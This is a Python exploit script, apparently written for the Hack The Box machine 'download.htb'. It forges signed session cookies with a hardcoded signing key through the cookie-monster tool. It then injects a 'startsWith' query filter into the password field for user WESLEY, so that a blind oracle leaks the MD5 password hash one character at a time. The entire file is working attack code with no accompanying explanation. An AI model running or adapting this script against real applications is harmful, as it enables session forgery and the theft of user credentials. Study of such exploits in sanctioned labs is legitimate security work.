import subprocess
import requests
import json
import sys

url = "http://download.htb/home/"  # HTB URL
payload_file = "new_cookie.json"
cookie_file = "cookie_file.json"  # File to save the stdout of cookie-monster
file_path = "found.txt"

cmd1 = "echo \"\""
result1 = subprocess.run(cmd1, shell=True, stdout=subprocess.PIPE, text=True)
stdout1 = result1.stdout

with open(file_path, "w") as file:
    file.write(stdout1)
    
def finish():
    with open(file_path, "r") as file:
        text1 = file.read()
        print(f"Password MD5 is {text1} for User wesley")
    sys.exit()
    
def main():
  
# Function to generate starts_with values
    def generate_starts_with(length, current_value):
        starts_with_values = []
        # If current_value is None, start with values from 0 to f
        if current_value is None:
            for character in "0123456789abcdef":  # Characters range from 0 to f
                starts_with_values.append(character)
        elif len(current_value) > 31:             # length 32 for MD5
            finish()
        else:
            for character in "0123456789abcdef":  # Characters range from 0 to f
                starts_with = current_value + character
                starts_with_values.append(starts_with)
        return starts_with_values

    found_positions = []

    while True:

        with open(file_path, "a+") as found_file:
            found_file.seek(0)
            found_positions = found_file.read().splitlines()

        for length in range(1, 33):  # Length ranges from 1 to 32
            current_position = 0  # Initialize the current position
            current_starts_with = None  # Initialize current_starts_with

            while current_position < len(found_positions):
                if current_starts_with is None:
                    current_starts_with = None if len(found_positions) == 0 else found_positions[current_position]
                starts_with_values = generate_starts_with(length, current_starts_with)

                for starts_with in starts_with_values:
                    # Skip positions that have already been found
                    if starts_with in found_positions:
                        continue
					
                    # Print the current starts_with value
                    print(f"Current startsWith: {starts_with}")               

                    # Save the payload to the new_cookie.json file
                    with open(payload_file, "w") as payload:
                        json.dump({
                            "flashes": {
                                "info": [],
                                "error": [],
                                "success": []
                            },
                            "user": {
                                "username": "WESLEY",
                                "password": {
                                    "startsWith": starts_with
                                }
                            }
                        }, payload)

                    # Run cookie-monster to generate the cookies and save stdout to cookie_file
                    command = f"cookie-monster -e -f {payload_file} -n download_session -k \"8929874489719802418902487651347865819634518936754\""
                    completed_process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
                    # Save the stdout of cookie-monster to cookie_file
                    with open(cookie_file, "w") as stdout_file:
                        stdout_file.write(completed_process.stdout)

                    # Clean up the cookies by removing "\x1b[39m" from the end
                    data_cookie = completed_process.stdout.split("Data Cookie: ")[1].split("\n")[0].replace("\x1b[39m", "").replace("download_session=", "")
                    sig_cookie = completed_process.stdout.split("Signature Cookie: ")[1].split("\n")[0].replace("\x1b[39m", "").replace("download_session.sig=", "")

                    cookiesd = {
                        "download_session": data_cookie,
                        "download_session.sig": sig_cookie
                    }

                    cookies = '; '.join([f'{key}={value}' for key, value in cookiesd.items()])

                    headers = {"Cookie": cookies}
                    response = requests.get(url, headers=headers)
                    # print(f"Current cookies: {cookies}")
                
                    if 'Copy Link' in response.text:
                        print(f"Found 'correct hash' at position {len(current_starts_with)+1} and value is {starts_with}")
                        found_positions.append(starts_with)
                        with open(file_path, "w") as found_file:
                            found_file.write(f"{starts_with}\n")
                        main()
                       

if __name__ == "__main__":
    main()                
